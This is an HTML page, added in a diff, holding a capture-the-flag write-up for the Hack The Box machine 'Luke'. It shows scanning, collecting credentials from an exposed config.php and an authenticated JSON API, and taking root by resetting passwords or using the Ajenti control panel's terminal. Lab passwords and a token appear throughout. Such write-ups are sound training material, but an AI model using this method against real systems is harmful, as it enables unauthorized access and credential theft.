@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Luke</strong></h1>
+        <em>Released: May 2019 / Pwned: June 25th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Luke is a good opportunity to learn the basics of JSON and how to retrieve data via a REST API. The box itself wasn't very difficult but the route to pwn teaches you not to skip over the basics and to enumerate thoroughly using multiple tools.<br>
+        <br>
+        <strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Nikto scan port 80 and find some credentials<br>
+        • Gobuster (and dirb) scan port 80 and find 2 login pages<br>
+        • Retrieve an auth token from port 3000 and collect user data and passwords<br>
+        • Find a config.php file that gives credentials for another login page<br>
+        • Drop into a root shell using the web apps built-in tools<br>
+        <br>
+        <strong></strong>
+        <h2 id="1"><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.137</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/luke#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.137<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.040s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;995&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                21/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsftpd&nbsp;3.0.3+&nbsp;(ext.1)<br>
+                |&nbsp;ftp-anon:&nbsp;Anonymous&nbsp;FTP&nbsp;login&nbsp;allowed&nbsp;(FTP&nbsp;code&nbsp;230)<br>
+                |_drwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512&nbsp;Apr&nbsp;14&nbsp;12:35&nbsp;webapp<br>
+                |&nbsp;ftp-syst:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;STAT:&nbsp;<br>
+                |&nbsp;FTP&nbsp;server&nbsp;status:<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connected&nbsp;to&nbsp;10.10.14.11<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logged&nbsp;in&nbsp;as&nbsp;ftp<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE:&nbsp;ASCII<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No&nbsp;session&nbsp;upload&nbsp;bandwidth&nbsp;limit<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No&nbsp;session&nbsp;download&nbsp;bandwidth&nbsp;limit<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Session&nbsp;timeout&nbsp;in&nbsp;seconds&nbsp;is&nbsp;300<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Control&nbsp;connection&nbsp;is&nbsp;plain&nbsp;text<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Data&nbsp;connections&nbsp;will&nbsp;be&nbsp;plain&nbsp;text<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;At&nbsp;session&nbsp;startup,&nbsp;client&nbsp;count&nbsp;was&nbsp;3<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsFTPd&nbsp;3.0.3+&nbsp;(ext.1)&nbsp;-&nbsp;secure,&nbsp;fast,&nbsp;stable<br>
+                |_End&nbsp;of&nbsp;status<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh?<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.38&nbsp;((FreeBSD)&nbsp;PHP/7.3.3)<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE<br>
+                |_http-server-header:&nbsp;Apache/2.4.38&nbsp;(FreeBSD)&nbsp;PHP/7.3.3<br>
+                |_http-title:&nbsp;Luke<br>
+                3000/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Node.js&nbsp;Express&nbsp;framework<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(application/json;&nbsp;charset=utf-8).<br>
+                8000/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Ajenti&nbsp;http&nbsp;control&nbsp;panel<br>
+                |_http-title:&nbsp;Ajenti<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        A full port scan didn't reveal anything new.<br>
+        <br>
+        <strong>Services running:</strong><br>
+        • 21/ftp - nmap has logged in anonymously and found a directory<br>
+        • 22/shh - ssh is running but nmap hasn't managed to fully identify the service running on the port<br>
+        • 80/http - a website called Luke<br>
+        • 3000/http - a JSON web application. Could be used to retrieve data.<br>
+        • 8000/http - an Ajenti control panel. Nothing we can do there without login credentials<br>
+        <br>
+        <strong></strong>
+        <h1><strong>Ports &amp; services</strong></h1>
+        <br>
+        <strong></strong>
+        <h2 id="2"><strong>2) 21/ftp</strong></h2><br>
+        I chose to have a look at ftp first considering we can log in as <code>anonymous</code>.<br>
+        No password is required.<br>
+        <br>
+        We find a note for Chihiro.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/21ftp#&nbsp;ftp&nbsp;10.10.10.137<br>
+                Connected&nbsp;to&nbsp;10.10.10.137.<br>
+                220&nbsp;vsFTPd&nbsp;3.0.3+&nbsp;(ext.1)&nbsp;ready...<br>
+                Name&nbsp;(10.10.10.137:root):&nbsp;anonymous<br>
+                331&nbsp;Please&nbsp;specify&nbsp;the&nbsp;password.<br>
+                Password:<br>
+                230&nbsp;Login&nbsp;successful.<br>
+                Remote&nbsp;system&nbsp;type&nbsp;is&nbsp;UNIX.<br>
+                Using&nbsp;binary&nbsp;mode&nbsp;to&nbsp;transfer&nbsp;files.<br>
+                ftp&gt;&nbsp;ls<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.&nbsp;Consider&nbsp;using&nbsp;PASV.<br>
+                150&nbsp;Here&nbsp;comes&nbsp;the&nbsp;directory&nbsp;listing.<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512&nbsp;Apr&nbsp;14&nbsp;12:35&nbsp;webapp<br>
+                226&nbsp;Directory&nbsp;send&nbsp;OK.<br>
+                ftp&gt;&nbsp;cd&nbsp;webapp<br>
+                250&nbsp;Directory&nbsp;successfully&nbsp;changed.<br>
+                ftp&gt;&nbsp;ls<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.&nbsp;Consider&nbsp;using&nbsp;PASV.<br>
+                150&nbsp;Here&nbsp;comes&nbsp;the&nbsp;directory&nbsp;listing.<br>
+                -r-xr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;306&nbsp;Apr&nbsp;14&nbsp;12:37&nbsp;for_Chihiro.txt<br>
+                226&nbsp;Directory&nbsp;send&nbsp;OK.<br>
+                ftp&gt;&nbsp;get&nbsp;for_Chihiro.txt<br>
+                local:&nbsp;for_Chihiro.txt&nbsp;remote:&nbsp;for_Chihiro.txt<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.&nbsp;Consider&nbsp;using&nbsp;PASV.<br>
+                150&nbsp;Opening&nbsp;BINARY&nbsp;mode&nbsp;data&nbsp;connection&nbsp;for&nbsp;for_Chihiro.txt&nbsp;(306&nbsp;bytes).<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                306&nbsp;bytes&nbsp;received&nbsp;in&nbsp;0.00&nbsp;secs&nbsp;(5.4042&nbsp;MB/s)<br>
+                ftp&gt;&nbsp;exit<br>
+                221&nbsp;Goodbye.<br>
+                root@gotham:~/ctf/luke/21ftp#&nbsp;ls<br>
+                for_Chihiro.txt<br>
+                root@gotham:~/ctf/luke/21ftp#&nbsp;cat&nbsp;for_Chihiro.txt&nbsp;<br>
+                Dear&nbsp;Chihiro&nbsp;!!<br>
+                <br>
+                As&nbsp;you&nbsp;told&nbsp;me&nbsp;that&nbsp;you&nbsp;wanted&nbsp;to&nbsp;learn&nbsp;Web&nbsp;Development&nbsp;and&nbsp;Frontend,&nbsp;I&nbsp;can&nbsp;give&nbsp;you&nbsp;a&nbsp;little&nbsp;push&nbsp;by&nbsp;showing&nbsp;the&nbsp;sources&nbsp;of&nbsp;<br>
+                the&nbsp;actual&nbsp;website&nbsp;I've&nbsp;created&nbsp;.<br>
+                Normally&nbsp;you&nbsp;should&nbsp;know&nbsp;where&nbsp;to&nbsp;look&nbsp;but&nbsp;hurry&nbsp;up&nbsp;because&nbsp;I&nbsp;will&nbsp;delete&nbsp;them&nbsp;soon&nbsp;because&nbsp;of&nbsp;our&nbsp;security&nbsp;policies&nbsp;!&nbsp;<br>
+                <br>
+                Derry&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        This note informs us that somewhere on this machine we can find the source code of the website, but that information isn't of much use to us at the moment :/<br>
+        <br>
+        <strong></strong>
+        <h2 id="3"><strong>3) 22/ssh</strong></h2><br>
+        I decided to have a look at the ssh port myself considering nmap didn't identify the service properly.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/22ssh#&nbsp;nc&nbsp;10.10.10.137&nbsp;22<br>
+                SSH-2.0-OpenSSH_7.8&nbsp;FreeBSD-20180909
+            </div>
+        </div><br>
+        There's nothing of interest but it was worth checking regardless, just in case.<br>
+        <br>
+        <strong></strong>
+        <h2 id="4"><strong>4) 80/http - Apache</strong></h2><br>
+        <code>http://10.10.10.137</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        We're welcomed to Luke LTD :)<br>
+        <br>
+        Nothing is going on on this page, so run some scans.<br>
+        <br>
+        <strong></strong>
+        <h3 id="4a"><strong>4a) Nikto</strong></h3><br>
+        Nikto finds some useful information.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/80-http#&nbsp;nikto&nbsp;-h&nbsp;http://10.10.10.137&nbsp;-o&nbsp;nikto.txt<br>
+                -&nbsp;Nikto&nbsp;v2.1.6<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Target&nbsp;IP:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.10.137<br>
+                +&nbsp;Target&nbsp;Hostname:&nbsp;&nbsp;&nbsp;&nbsp;10.10.10.137<br>
+                +&nbsp;Target&nbsp;Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80<br>
+                +&nbsp;Start&nbsp;Time:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-06-25&nbsp;10:55:55&nbsp;(GMT1)<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Server:&nbsp;Apache/2.4.38&nbsp;(FreeBSD)&nbsp;PHP/7.3.3<br>
+                ...<br>
+                +&nbsp;/config.php:&nbsp;PHP&nbsp;Config&nbsp;file&nbsp;may&nbsp;contain&nbsp;database&nbsp;IDs&nbsp;and&nbsp;passwords.<br>
+                +&nbsp;OSVDB-3268:&nbsp;/css/:&nbsp;Directory&nbsp;indexing&nbsp;found.<br>
+                +&nbsp;OSVDB-3092:&nbsp;/css/:&nbsp;This&nbsp;might&nbsp;be&nbsp;interesting...<br>
+                +&nbsp;/login.php:&nbsp;Admin&nbsp;login&nbsp;page/section&nbsp;found.<br>
+                +&nbsp;/package.json:&nbsp;Node.js&nbsp;package&nbsp;file&nbsp;found.&nbsp;It&nbsp;may&nbsp;contain&nbsp;sensitive&nbsp;information.<br>
+                +&nbsp;7862&nbsp;requests:&nbsp;0&nbsp;error(s)&nbsp;and&nbsp;11&nbsp;item(s)&nbsp;reported&nbsp;on&nbsp;remote&nbsp;host<br>
+                +&nbsp;End&nbsp;Time:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-06-25&nbsp;11:02:55&nbsp;(GMT1)&nbsp;(420&nbsp;seconds)<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;1&nbsp;host(s)&nbsp;tested
+            </div>
+        </div><br>
+        <br>
+        Key results from Nikto:<br>
+        • <code>/config.php</code> - contains root credentials for a mysql database<br>
+        • <code>/login.php</code> - a test login page<br>
+        <br>
+        Go retrieve root credentials for the mysql database from <code>http://10.10.10.137/config.php</code><br>
+        <code>$dbHost = 'localhost';<br>
+        $dbUsername = 'root';<br>
+        $dbPassword = 'Zk6heYCyv6ZE9Xcg';</code><br>
+        <br>
+        <strong></strong>
+        <h3 id="4b"><strong>4b) Gobuster</strong></h3><br>
+        Bruteforce for web pages using <code>gobuster</code>.<br>
+        <br>
+        One thing to note about <code>gobuster</code> is that it will ignore pages that respond with <em>'401 Unauthorized’</em> errors by default.<br>
+        <br>
+        Unfortunately (and I have a suspicion that it was intentional), this is a pretty crucial part of this machine. The 1 result that we end up needing from <code>gobuster</code> responds with a <em>401 Unauthorized</em> error, so make sure to include 401 using <code>-s</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/80-http#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.137&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt&nbsp;-s&nbsp;200,204,301,302,307,401,403&nbsp;-o&nbsp;gb-common.txt<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.137/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,401,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/06/25&nbsp;17:30:15&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.137/.hta&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.137/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.137/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.137/LICENSE&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.137/css&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.137/index.html&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.137/js&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.137/management&nbsp;(Status:&nbsp;401)<br>
+                http://10.10.10.137/member&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.137/vendor&nbsp;(Status:&nbsp;301)<br>
+                =====================================================<br>
+                2019/06/25&nbsp;17:30:40&nbsp;Finished<br>
+                =====================================================<br>
+            </div>
+        </div><br>
+        <br>
+        Alternatively, you could use <code>dirb</code>, which will find the <em>401</em> result no problem.<br>
+        <br>
+        Key result:<br>
+        • <code>/management</code> - a page requiring HTTP authentication in order to access<br>
+        <br>
+        <strong></strong>
+        <h2 id="5"><strong>5) 3000/http - Node.js</strong></h2><br>
+        JSON - JavaScript Object Notation - is a standardised syntax for storing and reading data. This service running on port 3000 is a web interface that will render that JSON data once we've requested it.<br>
+        <br>
+        <strong></strong>
+        <h3 id="5a"><strong>5a) Gobuster</strong></h3><br>
+        First, <code>gobuster</code> for any directories that might hold information.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/3000-json#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.137:3000&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt&nbsp;-o&nbsp;gb-common.txt<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.137:3000/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/06/25&nbsp;18:01:23&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.137:3000/Login&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.137:3000/login&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.137:3000/users&nbsp;(Status:&nbsp;200)<br>
+                =====================================================<br>
+                2019/06/25&nbsp;18:01:48&nbsp;Finished<br>
+                =====================================================
+            </div>
+        </div><br>
+        <br>
+        Results:<br>
+        • <code>/login</code> - where we need to submit our login credentials in order to receive an auth token<br>
+        • <code>/users</code> - looks like we can get user information from this service<br>
+        <br>
+        <strong></strong>
+        <h3 id="5b"><strong>5b) Get auth token</strong></h3><br>
+        To retrieve data from the JSON files you can use the REST API.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/3000-json#&nbsp;curl&nbsp;--request&nbsp;GET&nbsp;http://10.10.10.137:3000<br>
+                {"success":false,"message":"Auth&nbsp;token&nbsp;is&nbsp;not&nbsp;supplied"}
+            </div>
+        </div><br>
+        <br>
+        But in order to access this data we're told we first need an 'Auth token'.<br>
+        You can retrieve an auth token using the database credentials found in <code>http://10.10.10.137/config.php</code> and submitting them to <code>:8000/login</code>, which we found using gobuster.<br>
+        <br>
+        Bear in mind that the username you need to supply is <code>admin</code>, not <code>root</code>. I have no idea why.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/3000-json#&nbsp;curl&nbsp;--header&nbsp;"Content-Type:&nbsp;application/json"&nbsp;--request&nbsp;POST&nbsp;--data&nbsp;'{"username":"admin",&nbsp;"password":"Zk6heYCyv6ZE9Xcg"}'&nbsp;http://10.10.10.137:3000/login<br>
+                {"success":true,"message":"Authentication&nbsp;successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDcyOTUzLCJleHAiOjE1NjE1NTkzNTN9.NiyRt-GTVLftzfTlOqhrmKaPtrBLtQHnAx2OQoHGoNU"}
+            </div>
+        </div><br>
+        <br>
+        <strong></strong>
+        <h3 id="5c"><strong>5c) Get user data</strong></h3><br>
+        You can now submit the authorization token you've just received to get at the user information found in <code>/users</code><br>
+        I've cleaned up the output to make it easier to read. Normally it just comes out on one line.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/3000-json#&nbsp;curl&nbsp;--header&nbsp;"Content-Type:&nbsp;application/json"&nbsp;--header&nbsp;"Authorization:&nbsp;Bearer&nbsp;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDcyOTUzLCJleHAiOjE1NjE1NTkzNTN9.NiyRt-GTVLftzfTlOqhrmKaPtrBLtQHnAx2OQoHGoNU"&nbsp;--request&nbsp;GET&nbsp;http://10.10.10.137:3000/users<br>
+                [{"ID":"1","name":"Admin","Role":"Superuser"},<br>
+                {"ID":"2","name":"Derry","Role":"Web&nbsp;Admin"},<br>
+                {"ID":"3","name":"Yuri","Role":"Beta&nbsp;Tester"},<br>
+                {"ID":"4","name":"Dory","Role":"Supporter"}]
+            </div>
+        </div><br>
+        <br>
+        So the users we have are:<br>
+        • <code>Admin</code><br>
+        • <code>Derry</code><br>
+        • <code>Yuri</code><br>
+        • <code>Dory</code><br>
+        <br>
+        We can now query each of these usernames to get information about that user.<br>
+        <code>/user?&lt;user&gt;</code> doesn't work retrieve information but <code>/user/&lt;user&gt;</code> does.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/3000-json#&nbsp;curl&nbsp;--header&nbsp;"Content-Type:&nbsp;application/json"&nbsp;--header&nbsp;"Authorization:&nbsp;Bearer&nbsp;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDcyOTUzLCJleHAiOjE1NjE1NTkzNTN9.NiyRt-GTVLftzfTlOqhrmKaPtrBLtQHnAx2OQoHGoNU"&nbsp;--request&nbsp;GET&nbsp;http://10.10.10.137:3000/users/Admin<br>
+                {"name":"Admin","password":"WX5b7)&gt;/rp$U)FW"}<br>
+                <br>
+                root@gotham:~/ctf/luke/3000-json#&nbsp;curl&nbsp;--header&nbsp;"Content-Type:&nbsp;application/json"&nbsp;--header&nbsp;"Authorization:&nbsp;Bearer&nbsp;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDcyOTUzLCJleHAiOjE1NjE1NTkzNTN9.NiyRt-GTVLftzfTlOqhrmKaPtrBLtQHnAx2OQoHGoNU"&nbsp;--request&nbsp;GET&nbsp;http://10.10.10.137:3000/users/Derry<br>
+                {"name":"Derry","password":"rZ86wwLvx7jUxtch"}<br>
+                <br>
+                root@gotham:~/ctf/luke/3000-json#&nbsp;curl&nbsp;--header&nbsp;"Content-Type:&nbsp;application/json"&nbsp;--header&nbsp;"Authorization:&nbsp;Bearer&nbsp;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDcyOTUzLCJleHAiOjE1NjE1NTkzNTN9.NiyRt-GTVLftzfTlOqhrmKaPtrBLtQHnAx2OQoHGoNU"&nbsp;--request&nbsp;GET&nbsp;http://10.10.10.137:3000/users/Yuri<br>
+                {"name":"Yuri","password":"bet@tester87"}<br>
+                <br>
+                root@gotham:~/ctf/luke/3000-json#&nbsp;curl&nbsp;--header&nbsp;"Content-Type:&nbsp;application/json"&nbsp;--header&nbsp;"Authorization:&nbsp;Bearer&nbsp;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDcyOTUzLCJleHAiOjE1NjE1NTkzNTN9.NiyRt-GTVLftzfTlOqhrmKaPtrBLtQHnAx2OQoHGoNU"&nbsp;--request&nbsp;GET&nbsp;http://10.10.10.137:3000/users/Dory<br>
+                {"name":"Dory","password":"5y:!xa=ybfe)/QD"}
+            </div>
+        </div><br>
+        <br>
+        Now we have a list of usernames their passwords:<br>
+        • <code>Admin / WX5b7)&gt;/rp$U)FW</code><br>
+        • <code>Derry / rZ86wwLvx7jUxtch</code><br>
+        • <code>Yuri / bet@tester87</code><br>
+        • <code>Dory / 5y:!xa=ybfe)/QD</code><br>
+        <br>
+        <br>
+        <strong></strong>
+        <h2 id="6"><strong>6) /management</strong></h2><br>
+        By trial and error, I learnt that the credentials found from port 3000 are used with the <code>http://10.10.10.137/management</code> page that gobuster discovered earlier.<br>
+        <br>
+        <code>http://10.10.10.137/management</code><br>
+        Log in using <code>Dory / 5y:!xa=ybfe)/QD</code><br>
+        <br>
+        In <code>/config.json</code> you'll find the user <code>root</code> and their password - <code>KpMasng6S5EtTy9Z</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Everything in the ‘configs’ dropdown is related to Ajenti so presumably, this login &amp; pass is for the Ajenti service on port 8000.<br>
+        You can also see the port of the service at the bottom of the page under ‘bind'.<br>
+        <br>
+        Credentials found:<br>
+        <code>root / KpMasng6S5EtTy9Z</code><br>
+        <br>
+        <strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <strong></strong>
+        <h2 id="7"><strong>7) 8000/http - Ajenti Control Panel</strong></h2><br>
+        <code>http://10.10.10.137:8000/</code><br>
+        Log in using <code>root / KpMasng6S5EtTy9Z</code><br>
+        <br>
+        Ajenti is a control panel for remotely managing Linux systems.<br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        You have 2 options of how to reach root from here:<br>
+        • change Derry's password, change root's password, ssh in as derry and then switch user to root<br>
+        • use Ajenti's <em>Terminal</em> tool to get an interactive web shell as root<br>
+        <br>
+        <strong></strong>
+        <h3 id="7a"><strong>7a) Change passwords and ssh</strong></h3><br>
+        Navigate to Users &gt; Derry<br>
+        I changed derry's password to <code>greatwave</code><br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        Navigate to Users &gt; System Users &gt; root<br>
+        I change root's password to <code>greaterwave</code><br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        SSH in as derry and retrieve the user flag.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/luke/3000-json#&nbsp;ssh&nbsp;derry@10.10.10.137<br>
+                Password&nbsp;for&nbsp;derry@luke:&nbsp;greatwave<br>
+                ...<br>
+                $&nbsp;id<br>
+                uid=1001(derry)&nbsp;gid=1001(derry)&nbsp;groups=1001(derry),0(wheel)<br>
+                $&nbsp;cd&nbsp;~<br>
+                $&nbsp;ls<br>
+                user.txt<br>
+                $&nbsp;cat&nbsp;user.txt<br>
+                58d4...<br>
+            </div>
+        </div><br>
+        <br>
+        And switch user to root and retrieve the root flag!<br>
+            <div class="codebox">
+                $&nbsp;su&nbsp;root<br>
+                Password:&nbsp;greaterwave<br>
+                root@luke:/home/derry&nbsp;#&nbsp;ls<br>
+                root@luke:/home/derry&nbsp;#&nbsp;cd&nbsp;~<br>
+                root@luke:~&nbsp;#&nbsp;cat&nbsp;root.txt<br>
+                8448...
+            </div>
+        </div><br>
+        <br>
+        <strong></strong>
+        <h3 id="7b"><strong>7b) Use Ajenti's Terminal tool</strong></h3>
+        Navigate to Terminal &gt; +New<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <br>
+        Select your newly created terminal and type at the bottom where it says <em>'Paste here'</em> to input commands. You're root!<br>
+        The terminal was fairly slow for me so you'll probably have to be patient with it.<br>
+        <br>
+        <img alt="images\2-8.png" src="images/2-8.png">
+    </writeup>
+</section>
+
+</body>
+</html>
